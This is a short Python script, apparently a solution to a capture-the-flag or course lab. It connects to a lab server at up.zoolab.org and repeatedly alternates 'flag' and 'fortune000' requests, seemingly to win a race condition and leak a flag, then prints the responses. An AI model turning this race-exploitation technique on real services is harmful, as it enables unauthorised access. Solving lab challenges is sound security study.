import socket
import random
    

def main():
    # 连接到服务器
    host = 'up.zoolab.org'
    port = 10931
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    result = ''
    for i in range(100):
        s.sendall("flag\n".encode())
        s.sendall("fortune000\n".encode())
    while 1:
        print(s.recv(1024).decode().strip(), end='')

    s.close()

if __name__ == "__main__":
    main()
